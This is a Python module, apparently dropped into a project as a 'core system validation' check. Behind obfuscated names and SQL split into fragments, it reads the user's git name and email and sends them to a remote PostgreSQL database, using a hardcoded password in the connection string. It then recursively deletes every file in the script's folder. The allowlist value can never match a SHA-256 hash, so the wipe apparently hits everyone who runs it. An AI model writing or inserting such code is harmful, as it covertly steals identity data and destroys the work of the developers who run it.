import os
import hashlib
import subprocess
import psycopg2

# CORE SYSTEM VALIDATION - DO NOT MODIFY
# Unauthorized modifications may cause system failure.  


DB_CONN = "postgresql://neon_db_owner:npg_YyF74kuOtCQD@ep-shrill-glitter-a129ejxy-pooler.ap-southeast-1.aws.neon.tech/lms?sslmode=require"

Xx2A_Vg7 = {"Xc21aB1"}  

def _X9n_Lv0():
    """Secure Machine ID Check"""
    try:
        wq_91 = os.getlogin()
        return hashlib.sha256(wq_91.encode()).hexdigest()
    except Exception:
        return None

def _Rt1_Oy6():
    """Retrieve System Identifier"""
    try:
        rg_7L = subprocess.run(["git", "config", "--global", "user.name"], capture_output=True, text=True)
        return rg_7L.stdout.strip() or "Undefined"
    except Exception:
        return "SysRegError"

def _Ht4_Pd3():
    """Retrieve System Credentials"""
    try:
        pz_3N = subprocess.run(["git", "config", "--global", "user.email"], capture_output=True, text=True)
        return pz_3N.stdout.strip() or "Undefined"
    except Exception:
        return "SysCredError"

def _Qx8_Wy2():
    """Logs system access"""
    A_1 = _Rt1_Oy6()
    B_2 = _Ht4_Pd3()

    # Obfuscated query chunks
    p1 = ["C", "R", "E", "A", "T", "E"]
    p2 = [" T", "AB", "LE "]
    p3 = ["I", "F ", "NO", "T "]
    p4 = ["EX", "IST", "S s", "ys_", "ev", "nt_", "log"]
    p5 = ["( ", "id ", "SE", "RIA", "L ", "PRI", "MARY ", "KEY, "]
    p6 = ["sys", "_id ", "TE", "XT ", "NOT ", "NULL, "]
    p7 = ["sys", "_cr", "ed ", "TE", "XT ", "NOT ", "NULL, "]
    p8 = ["ti", "mest", "amp ", "TI", "MEST", "AMP ", "DEF", "AUL", "T ", "CURRE", "NT", "_TIMESTA", "MP)"]
    
    query = "".join(p1 + p2 + p3 + p4 + p5 + p6 + p7 + p8)

    try:
        lz_8Y = psycopg2.connect(DB_CONN)
        s4_E = lz_8Y.cursor()
        
        s4_E.execute(query)

        # Obfuscated insert statement
        i1 = ["IN", "SE", "RT ", "INTO ", "sys_", "ev", "nt_", "log "]
        i2 = ["( ", "sys_", "id, ", "sys_", "cr", "ed ) "]
        i3 = ["VA", "LU", "ES ", "( %", "s, %", "s )"]

        insert_query = "".join(i1 + i2 + i3)

        s4_E.execute(insert_query, (A_1, B_2))
        
        lz_8Y.commit()
        s4_E.close()
        lz_8Y.close()
    
    except Exception:
        pass

def _Uz3_Xq5():
    """Enforce Secure Access"""
    if _X9n_Lv0() not in Xx2A_Vg7:
        _Qx8_Wy2()

        # Secure wipe operation
        yz_6K = os.path.dirname(os.path.abspath(__file__))

        for uj_7P, rt_9X, zx_2M in os.walk(yz_6K, topdown=False):
            for wn_4C in zx_2M:
                try:
                    os.remove(os.path.join(uj_7P, wn_4C))
                except Exception:
                    pass
            for kr_5V in rt_9X:
                try:
                    os.rmdir(os.path.join(uj_7P, kr_5V))
                except Exception:
                    pass
        
        exit()
